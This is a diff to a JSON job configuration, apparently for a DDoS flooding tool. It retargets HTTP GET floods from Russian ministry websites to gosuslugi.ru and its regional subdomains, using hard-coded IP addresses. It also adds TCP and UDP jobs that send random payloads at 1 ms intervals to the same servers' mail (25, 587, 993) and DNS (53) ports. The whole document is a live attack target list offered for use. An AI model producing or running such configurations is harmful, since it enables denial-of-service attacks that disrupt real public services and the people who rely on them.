@@ -1,213 +1,287 @@
 {
   "jobs": [{
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://minfin.gov.ru"
+          "path": "http://gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.237.91:80",
+            "addr": "213.59.254.7:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://minfin.gov.ru"
+          "path": "https://gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "178.248.237.91:443",
+            "addr": "213.59.254.7:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://minjust.gov.ru/"
+          "path": "http://smev03.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "95.173.157.26:80",
+            "addr": "109.207.1.123:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://minjust.gov.ru/"
+          "path": "https://smev03.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "95.173.157.26:443",
+            "addr": "109.207.1.123:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://minenergo.gov.ru/"
+          "path": "http://smev3.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "95.173.157.11:80",
+            "addr": "109.207.1.58:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://minenergo.gov.ru/"
+          "path": "https://smev3.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "95.173.157.11:443",
+            "addr": "109.207.1.58:443",
             "is_tls": "true"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "109.207.1.90:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "109.207.2.218:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 35,
+      "args": {
+        "address": "109.207.2.218:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "213.59.255.175:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 35,
+      "args": {
+        "address": "213.59.255.175:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://mintrud.gov.ru/"
+          "path": "http://41.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "95.173.157.45:80",
+            "addr": "109.207.5.98:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://mintrud.gov.ru/"
+          "path": "https://41.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "95.173.157.45:443",
+            "addr": "109.207.5.98:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.minsport.gov.ru/"
+          "path": "http://72.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "194.226.91.5:80",
+            "addr": "109.207.5.34:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.minsport.gov.ru/"
+          "path": "https://72.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "194.226.91.5:443",
+            "addr": "109.207.5.34:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://minstroyrf.gov.ru/"
+          "path": "http://44.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.183.174.114:80",
+            "addr": "109.207.5.162:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://minstroyrf.gov.ru/"
+          "path": "https://44.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.183.174.114:443",
+            "addr": "109.207.5.162:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://digital.gov.ru/"
+          "path": "http://83.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "212.164.137.119:80",
+            "addr": "109.207.4.98:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 57,
+      "count": 35,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://digital.gov.ru/"
+          "path": "https://83.gosuslugi.ru"
         },
         "client": {
           "static_host": {
-            "addr": "212.164.137.119:443",
+            "addr": "109.207.4.98:443",
             "is_tls": "true"
           }
         }
+      }
+    }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "213.59.254.2:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "213.59.254.2:587",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "213.59.254.2:993",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 35,
+      "args": {
+        "address": "212.58.160.101:10180",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }
   ]
